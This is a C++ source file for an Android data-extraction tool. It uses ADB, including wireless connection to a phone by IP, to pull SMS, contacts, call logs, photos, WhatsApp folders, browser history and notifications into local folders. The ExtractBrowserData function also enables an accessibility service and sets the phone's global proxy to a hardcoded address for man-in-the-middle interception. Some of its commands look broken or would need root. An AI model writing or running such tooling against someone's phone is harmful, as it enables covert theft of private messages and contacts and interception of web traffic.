#include "model.h"

#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <iostream>
#include <regex>

const std::string ADB_CONNECT = "adb connect <device_ip>:5555";
const std::string ADB_DISCONNECT = "adb disconnect <device_ip>:5555";
const std::string ADB_PULL = "adb pull <remote_path> <local_path>";
const std::string ADB_SHELL = "adb shell ";
const char* ADB_BACKUP_SMS =
    "adb backup -noapk -f Datas/Phone_dump_sms.ab -nocompress "
    "com.android.providers.telephony";

const std::string MODEL_RED = "\033[31m";
const std::string MODEL_WHITE = "\033[0m";

std::string Model::GetDeviceModel() const { return deviceModel; }

void Model::Shell(std::string command) {
    std::string output = executeCommand(ADB_SHELL + command);
    printf("%s\n", output.c_str());
}

std::string Model::executeCommand(const std::string& cmd) {
    char buffer[128];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");

    if (!pipe) return "";

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);

    return result;
}

bool Model::CheckDevice() {
    std::string output = executeCommand("adb devices -l");

    if (output.find("model") != std::string::npos) {
        std::regex pattern("device:[a-z0-9]+");
        std::smatch match;

        if (std::regex_search(output, match, pattern)) {
            deviceModel = match.str();
            return true;
        }
    }

    return false;
}

void Model::DumpSMS() {
    fs::create_directories("Datas");

    system(ADB_BACKUP_SMS);
    system(
        "mvt-android check-backup Datas/Phone_dump_sms.ab -o Datas/ && rm "
        "Datas/Phone_dump_sms.ab");
}

void Model::DumpPhotos() {
    fs::create_directories("Datas");
    system("adb pull /sdcard/Pictures Datas/");
}

void Model::DumpDownloads() {
    fs::create_directories("Datas");
    system("adb pull /sdcard/Download Datas/");
}

void Model::CheckAdb() {
    std::string output = executeCommand("adb version");

    if (output.empty()) {
#ifdef _WIN32
        std::cout << "ADB未安装，正在安装..." << std::endl;
        system("powershell -Command \"winget install Google.PlatformTools\"");

        std::string home = getenv("USERPROFILE");
        std::string adbPath =
            home + "\\AppData\\Local\\Android\\Sdk\\platform-tools";
        std::string cmd = "setx PATH \"%PATH%;" + adbPath + "\"";
        system(cmd.c_str());
#elif __APPLE__
        std::cout << "ADB未安装，正在安装..." << std::endl;
        system("brew install android-platform-tools");
#else
        std::cout << "请手动安装ADB工具" << std::endl;
        exit(1);
#endif
        std::cout << "请重启终端以使环境变量生效" << std::endl;
        exit(0);
    }
}

void Model::DumpContacts() {
    fs::create_directories("Datas");
    system(
        "adb pull "
        "/data/data/com.android.providers.contacts/databases/contacts2.db "
        "Datas/");
    system(
        "adb pull "
        "/data/data/com.android.providers.contacts/databases/calllog.db "
        "Datas/");
}

void Model::DumpMessage() {
    fs::create_directories("Datas");
    system(
        "adb pull "
        "/data/data/com.android.providers.telephony/databases/mmssms.db "
        "Datas/");
}

void Model::Dumpfiles() {
    fs::create_directories("Datas");
    system("adb pull /sdcard/ Datas/sdcard/");
}

void Model::ConnectWirelessly() {
    std::string ip;
    std::cout << "请输入手机IP地址: ";
    std::getline(std::cin, ip);

    std::string connect_cmd = "adb connect " + ip + ":5555";
    std::string output = executeCommand(connect_cmd);

    if (output.find("connected") != std::string::npos) {
        std::cout << "成功连接到设备 " << ip << std::endl;
    } else {
        std::cout << "连接失败，请确保:" << std::endl;
        std::cout << "1. 手机和电脑在同一网络" << std::endl;
        std::cout << "2. 手机已启用USB调试和无线调试" << std::endl;
        std::cout << "3. IP地址正确" << std::endl;
    }
}

void Model::DumpCallLogs() {
    fs::create_directories("Datas/CallLogs");

    system(
        "adb shell content query --uri content://call_log/calls "
        "--projection date,number,duration,type "
        "> Datas/CallLogs/call_logs.log");

    system(
        "adb shell \"content query --uri content://call_log/calls "
        "--projection date,number,duration,type "
        "| awk '{print strftime(\\\"%Y-%m-%d %H:%M:%S\\\", substr(\\$1, "
        "2)/1000), \\$2, \\$3, \\$4}' "
        "\" > Datas/CallLogs/formatted_call_logs.log");
}

void Model::DumpVideos() {
    fs::create_directories("Datas");
    system("adb pull /sdcard/DCIM/Camera Datas/Videos/");
    system("adb pull /sdcard/Movies Datas/Videos/");
}

void Model::DumpApks() {
    fs::create_directories("Datas/APKs");
    system("adb shell pm list packages -f > Datas/APKs/installed_apps.log");
    system("adb pull /data/app/ Datas/APKs/");
}

void Model::DumpDocuments() {
    fs::create_directories("Datas/Documents");
    system("adb pull /sdcard/Documents Datas/Documents/");
    system("adb pull /sdcard/Download Datas/Documents/");
}

void Model::ExtractSensitiveInfo() {
    fs::create_directories("Datas/Sensitive");
    system("adb pull /sdcard/ Datas/Sensitive/");
}

void Model::GetWifiAddress() {
    fs::create_directories("Datas/Network");

    // Get WiFi IP address and interface info
    std::string wifiInfo = executeCommand(
        "adb shell \"ip addr show wlan0 2>/dev/null || ip addr show wlan1\"");

    // Get current WiFi connection info
    std::string wifiConnection =
        executeCommand("adb shell \"dumpsys wifi | grep 'mWifiInfo'\"");

    // Get all network interfaces
    std::string allInterfaces = executeCommand("adb shell ip addr");

    // Get routing table
    std::string routingTable = executeCommand("adb shell ip route");

    // Write all information to file with proper error handling
    try {
        // Create timestamp for the report
        auto now = std::chrono::system_clock::now();
        auto timeStamp = std::chrono::system_clock::to_time_t(now);

        std::ofstream file("Datas/Network/network_info.log");
        if (!file.is_open()) {
            throw std::runtime_error("Cannot create network info file");
        }

        file << "=== Network Information Report ===" << std::endl;
        file << "Generated: " << std::ctime(&timeStamp);
        file << "Device Model: " << deviceModel << std::endl << std::endl;

        file << "=== WiFi Interface Information ===" << std::endl;
        file << (wifiInfo.empty() ? "No WiFi interface found" : wifiInfo)
             << std::endl;

        file << "=== Current WiFi Connection ===" << std::endl;
        file << (wifiConnection.empty() ? "No active WiFi connection"
                                        : wifiConnection)
             << std::endl;

        file << "=== All Network Interfaces ===" << std::endl;
        file << allInterfaces << std::endl;

        file << "=== Routing Table ===" << std::endl;
        file << routingTable << std::endl;

        file.close();

        // Extract and validate IP address using regex
        std::regex ipPattern(R"(inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}))");
        std::smatch match;
        if (std::regex_search(wifiInfo, match, ipPattern)) {
            std::string ip = match[1];
            std::ofstream ipFile("Datas/Network/wireless_debug_ip.log");
            if (!ipFile.is_open()) {
                throw std::runtime_error(
                    "Cannot create wireless debug IP file");
            }
            ipFile << "=== ADB Wireless Debug Information ===" << std::endl;
            ipFile << "Generated: " << std::ctime(&timeStamp);
            ipFile << "IP Address: " << ip << std::endl;
            ipFile << "Port: 5555" << std::endl;
            ipFile << "Connection Command: adb connect " << ip << ":5555"
                   << std::endl;
            ipFile.close();
        }
    } catch (const std::exception& e) {
        std::cerr << MODEL_RED << "[!] Error: " << e.what() << MODEL_WHITE
                  << std::endl;
    }
}

void Model::DumpSystemInfo() {
    fs::create_directories("Datas/System");
    system("adb shell dumpsys > Datas/System/system_info.log");
}

void Model::ListPackages() {
    fs::create_directories("Datas/Packages");
    system(
        "adb shell pm list packages > Datas/Packages/installed_packages.log");
}

void Model::ExtractWhatsApp() {
    fs::create_directories("Datas/WhatsApp");
    system("adb pull /sdcard/Android/data/com.whatsapp/ Datas/WhatsApp/");
}

void Model::ExtractBrowserData() {
    fs::create_directories("Datas/Browser");

    // Enable accessibility service for Chrome
    system(
        "adb shell settings put secure enabled_accessibility_services "
        "com.android.chrome/"
        "com.android.chrome.accessibility.AccessibilityService");

    // Extract HTTPS URLs from logcat
    system("adb logcat -d | grep -i \"https\" > Datas/Browser/https_urls.log");

    // Pull Chrome and WebView cache
    system(
        "adb pull /sdcard/Android/data/com.android.chrome/cache/ "
        "Datas/Browser/chrome_cache/");
    system(
        "adb pull /data/data/com.android.webview/cache/ "
        "Datas/Browser/webview_cache/");

    // Set up proxy for MITM
    system("adb shell settings put global http_proxy 192.168.1.100:8080");

    // Pull and analyze Chrome history
    system(
        "adb pull /data/data/com.android.chrome/app_chrome/Default/History "
        "Datas/Browser/");
    system(
        "sqlite3 Datas/Browser/History \"SELECT * FROM urls;\" > "
        "Datas/Browser/browsing_history.log");
}

void Model::ExtractNotifications() {
    fs::create_directories("Datas/Notifications");
    system(
        "adb shell dumpsys notification > "
        "Datas/Notifications/notifications.log");
}